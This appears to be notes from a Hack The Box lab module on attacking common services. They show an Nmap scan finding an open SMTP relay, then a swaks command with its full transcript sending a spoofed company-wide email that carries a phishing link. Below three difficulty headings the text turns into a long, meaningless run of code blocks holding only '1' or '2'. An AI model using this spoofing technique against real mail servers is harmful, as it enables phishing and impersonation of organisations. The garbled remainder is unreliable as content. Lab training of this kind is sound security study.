Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-28 23:59 EDT
Nmap scan report for 10.10.11.213
Host is up (0.28s latency).

PORT   STATE SERVICE
25/tcp open  smtp
|_smtp-open-relay: Server is an open relay (14/16 tests)
```
(shodan)[https://www.shodan.io/]
```
Attacking Email Services
mdmithu@htb[/htb]# swaks --from notifications@inlanefreight.com --to employees@inlanefreight.com --header 'Subject: Company Notification' --body 'Hi All, we want to hear from you! Please complete the following survey. http://mycustomphishinglink.com/' --server 10.10.11.213

=== Trying 10.10.11.213:25...
=== Connected to 10.10.11.213.
<-  220 mail.localdomain SMTP Mailer ready
 -> EHLO parrot
<-  250-mail.localdomain
<-  250-SIZE 33554432
<-  250-8BITMIME
<-  250-STARTTLS
<-  250-AUTH LOGIN PLAIN CRAM-MD5 CRAM-SHA1
<-  250 HELP
 -> MAIL FROM:<notifications@inlanefreight.com>
<-  250 OK
 -> RCPT TO:<employees@inlanefreight.com>
<-  250 OK
 -> DATA
<-  354 End data with <CR><LF>.<CR><LF>
 -> Date: Thu, 29 Oct 2020 01:36:06 -0400
 -> To: employees@inlanefreight.com
 -> From: notifications@inlanefreight.com
 -> Subject: Company Notification
 -> Message-Id: <20201029013606.775675@parrot>
 -> X-Mailer: swaks v20190914.0 jetmore.org/john/code/swaks/
 -> 
 -> Hi All, we want to hear from you! Please complete the following survey. http://mycustomphishinglink.com/
 -> 
 -> 
 -> .
<-  250 OK
 -> QUIT
<-  221 Bye
=== Connection closed with remote host.
```
## Attacking Common Services - Easy

```
2
```
```
1
```
```
2
```
```
1
```

```
2
```
```
1
```
```
2
```
```
1
```
## Attacking Common Services - Medium
```
2
```
```
1
```
```
2
```

```
1
```
```
2
```
```
1
```
```
2
```
```
1
```
```
2
```
```
1
```
```
2
```
```
1
```
## Attacking Common Services - Hard

```
2
```
```
1
```
```
2
```
```
1
```
```
2
```
```
1
```
```
2
```
```
1
```
```
2
```
```
1
```
```
2
```
```
1
```
```
2
```
```
1
```
```
2
```
```
1
```
```
2
```
```
1
```
```
2
```
```
1
```
```
2
```
```
1
```
```
2
```
```
1
```
```
2
```
```
1
```
```
2
```
```
1
```
```
2
```
```
1
```
```
2
```
```
1
```
```
2
```

```
1
```
```
2
```
```
1
```
```
2
```
```
1
```
```
2
```
```
1
```
```
2
```
```
1
```
```
2
```
```
1
```
```
2
```
```
1
```
```
2
```
```
1
```
```
2
```
```
1
```
```
2
```
```
1
```
```
2
```
```
1
```
```
2
```
```
1
```
```
2
```
```
1
```
```
2
```
```
1
```
```
2
```
```
1
```
```
2
```
```
1
```
```
2
```
```
1
```
```
2
```
```
1
```
```
2
```
```
1
```
```
2
```
```
1
```
```
2
```
```
1
```
```
2
```

```
1
```
```
2
```
```
1
```
```
2
```
```
1
```
```
2
```
```
1
```
```
2
```
```
1
```
```
2
```
```
1
```
```
2
```
```
1
```
```
2
```
```
1
```
```
2
```
```
1
```
```
2
```
```
1
```
```
2
```
```
1
```
```
2
```
```
1
```
```
2
```
```
1
```
```
2
```
```
1
```
```
2
```
```
1
```
```
2
```
```
1
```
```
2
```
```
1
```
```
2
```
```
1
```
```
2
```
```
1
```
```
2
```
```
1
```
```
2
```
```
1
```
```
2
```
```
1
```
```
2
```
```
1
```
```
2
```
```
1
```
```
2
```
```
1
```
```
2
```
```
1
```
```
2
```
```
1
```
```
2
```
```
1
```
```
2
```
```
1
```
```
2
```
```
1
```
```
2
```
```
1
```
```
2
```
```
1
```
```
2
```
```
1
```
```
2
```
```
1
```
```
2
```
```
1
```
```
2
```
```
1
```
```
2
```
```
1
```
```
2
```
```
1
```
```
2
```
```
1
```
```
2
```
```
1
```
```
2
```
```
1
```
```
2
```
```
1
```
```
2
```

```
1
```
```
2
```
```
1
```
```
2
```
```
1
```
```
2
```
```
1
```
```
2
```
```
1
```
```
2
```
```
1
```
```
2
```
```
1
```
```
2
```
```
1
```
```
2
```
```
1
```
```
2
```
```
1
```
```
2
```
```
1
```
```
2
```
```
1
```
```
2
```
```
1
```
```
2
```
```
1
```
```
2
```
```
1
```
```
2
```
```
1
```
```
2
```
```
1
```
```
2
```
```
1
```
```
2
```
```
1
```
```
2
```
```
1
```
```
2
```
```
1
```
```
2
```

